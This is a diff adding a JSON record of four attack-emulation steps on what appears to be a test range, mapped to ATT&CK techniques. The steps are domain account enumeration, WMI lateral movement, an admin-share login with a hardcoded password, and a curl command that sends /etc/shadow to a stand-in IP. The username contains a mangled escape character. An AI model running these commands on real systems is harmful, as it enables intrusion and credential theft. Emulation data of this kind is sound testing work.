@@ -1,0 +1,38 @@
+[
+  {
+    "step_id": "step-01-recon",
+    "technique_id": "T1087",
+    "status": "success",
+    "executed_action": "net user /domain",
+    "target_asset": "srv-dc-01.range.corp",
+    "exit_code": 0,
+    "raw_log": "Enumerated domain accounts on srv-dc-01.range.corp"
+  },
+  {
+    "step_id": "step-02-lateral",
+    "technique_id": "T1047",
+    "status": "success",
+    "executed_action": "wmic /node:srv-app-02 process call create 'cmd.exe /c whoami'",
+    "target_asset": "srv-app-02.range.corp",
+    "exit_code": 0,
+    "raw_log": "Spawned remote process on srv-app-02.range.corp via WMI"
+  },
+  {
+    "step_id": "step-03-anomaly",
+    "technique_id": "T1021.002",
+    "status": "success",
+    "executed_action": "net use \\srv-db-01\\C$ /u:corp\u0007dmin Secret123",
+    "target_asset": "srv-db-01.range.corp",
+    "exit_code": 0,
+    "raw_log": "Mounted admin share on srv-db-01.range.corp"
+  },
+  {
+    "step_id": "step-04-exfil",
+    "technique_id": "T1048",
+    "status": "success",
+    "executed_action": "curl --data-binary @/etc/shadow http://198.51.100.22/collect",
+    "target_asset": "srv-exfil-01.range.corp",
+    "exit_code": 0,
+    "raw_log": "Exfiltrated payload over HTTP port 80"
+  }
+]
